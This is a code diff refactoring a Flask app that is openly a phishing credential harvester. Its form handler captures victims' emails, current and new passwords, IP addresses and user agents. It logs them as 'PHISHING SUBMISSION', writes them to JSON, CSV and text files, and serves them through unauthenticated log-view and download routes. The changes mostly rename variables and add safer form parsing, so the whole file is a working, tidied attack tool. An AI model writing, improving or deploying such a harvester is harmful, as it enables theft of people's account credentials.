@@ -1,10 +1,20 @@
 # app/app.py
-import os, json, datetime, socket, uuid, platform, re, csv, sys
-from flask import Flask, render_template, request, redirect, send_file, jsonify, Response
+
+import os
+import json
+import datetime
+import socket
+import uuid
+import platform
+import re
+import csv
+import sys
+
+from flask import Flask, render_template, request, redirect, url_for, send_file, jsonify, Response
 
 # then figure out paths
-base_dir    = os.path.dirname(os.path.abspath(__file__))
-assets_dir  = os.path.join(base_dir, 'assets')
+base_dir   = os.path.dirname(os.path.abspath(__file__))
+assets_dir = os.path.join(base_dir, 'assets')
 
 # then data directory (project-local ./data)
 DATA_DIR      = os.environ.get('DATA_DIR', os.path.join(base_dir, 'data'))
@@ -58,6 +68,7 @@ def get_system_info():
             "platform": platform.platform(),
             "system": platform.system(),
             "release": platform.release(),
+            "version": platform.version(),
             "machine": platform.machine(),
             "processor": platform.processor()
         }
@@ -84,71 +95,80 @@ System Info:
 # then routes
 @app.route('/')
 def index():
-    return render_template('index.html')
+    return Response(render_template('index.html'), mimetype='text/html')
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    # then grab form
-    email    = request.form['email']
-    current  = request.form['currentPassword']
-    new      = request.form['newPassword']
-    confirm  = request.form['confirmPassword']
+    # then get form data safely (avoid KeyError → 400)
+    email            = request.form.get('email', '')
+    current_password = request.form.get('currentPassword', '')
+    new_password     = request.form.get('newPassword', '')
+    confirm_password = request.form.get('confirmPassword', '')
 
     # then client info
-    ip       = request.headers.get('X-Forwarded-For', request.remote_addr)
-    mac      = get_mac_address()
-    host     = socket.gethostname()
-    agent    = request.headers.get('User-Agent')
-    sysInfo  = get_system_info()
-    ts       = datetime.datetime.utcnow().isoformat()
+    client_ip   = request.headers.get('X-Forwarded-For', request.remote_addr)
+    mac_address = get_mac_address()
+    hostname    = socket.gethostname()
+    user_agent  = request.headers.get('User-Agent')
+    system_info = get_system_info()
+    timestamp   = datetime.datetime.utcnow().isoformat()
 
-    # then assemble
-    data = {
-        "timestamp":      ts,
-        "email":          email,
-        "current_password": current,
-        "new_password":     new,
-        "confirm_password": confirm,
-        "ip_address":       ip,
-        "mac_address":      mac,
-        "hostname":         host,
-        "user_agent":       agent,
-        "system_info":      sysInfo
+    # then assemble visitor info
+    visitor_info = {
+        "timestamp":        timestamp,
+        "email":            email,
+        "current_password": current_password,
+        "new_password":     new_password,
+        "confirm_password": confirm_password,
+        "ip_address":       client_ip,
+        "mac_address":      mac_address,
+        "hostname":         hostname,
+        "user_agent":       user_agent,
+        "system_info":      system_info,
     }
 
-    # then log to console
-    log_to_console(f"PHISHING SUBMISSION:\n{json.dumps(data,indent=2)}")
+    # then log submission to console
+    log_to_console(f"PHISHING SUBMISSION:\n{json.dumps(visitor_info, indent=2)}")
 
-    # then append to files
+    # then append to JSON
     with open(LOG_FILE_JSON, 'a') as f:
-        f.write(json.dumps(data, default=str) + "\n")
+        f.write(json.dumps(visitor_info, default=str) + "\n")
+
+    # then append to CSV
     with open(LOG_FILE_CSV, 'a', newline='') as f:
         writer = csv.writer(f)
         writer.writerow([
-            ts, email, current, new, confirm, ip, mac, host, agent
+            timestamp,
+            email,
+            current_password,
+            new_password,
+            confirm_password,
+            client_ip,
+            mac_address,
+            hostname,
+            user_agent,
         ])
-    with open(LOG_FILE_TXT, 'a') as f:
-        f.write(format_readable_log(data) + "\n" + "-"*80 + "\n\n")
 
+    # then append to TXT
+    with open(LOG_FILE_TXT, 'a') as f:
+        f.write(format_readable_log(visitor_info) + "\n" + "-"*80 + "\n\n")
+
+    # then always redirect to success
     return redirect('/success')
 
 @app.route('/success')
 def success():
-    return render_template('success.html')
+    return Response(render_template('success.html'), mimetype='text/html')
 
 @app.route('/view-logs')
 def view_logs():
-    # then read text log
     with open(LOG_FILE_TXT) as f:
         content = f.read()
     count = content.count("=== Submission at")
-    return render_template('logs.html',
-                           logs=content,
-                           total=count)
+    return Response(render_template('logs.html', logs=content, total=count), mimetype='text/html')
 
 @app.route('/data/<kind>')
 def download(kind):
-    # then serve raw files
     mapping = {
         'json': LOG_FILE_JSON,
         'csv':  LOG_FILE_CSV,
@@ -156,11 +176,12 @@ def download(kind):
     }
     path = mapping.get(kind)
     if not path:
-        return jsonify(error="Use json, csv or txt"), 400
-    return send_file(path,
-                     as_attachment=True,
-                     download_name=f"submissions.{kind}")
+        return jsonify(error="Invalid file type, use json/csv/txt"), 400
+    return send_file(path, as_attachment=True, download_name=f"submissions.{kind}")
 
-# then run
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.getenv('PORT',5000)), debug=bool(os.getenv('DEBUG')))
+    app.run(
+        host=os.environ.get('HOST','0.0.0.0'),
+        port=int(os.environ.get('PORT', 5000)),
+        debug=os.environ.get('DEBUG','False').lower()=='true'
+    )
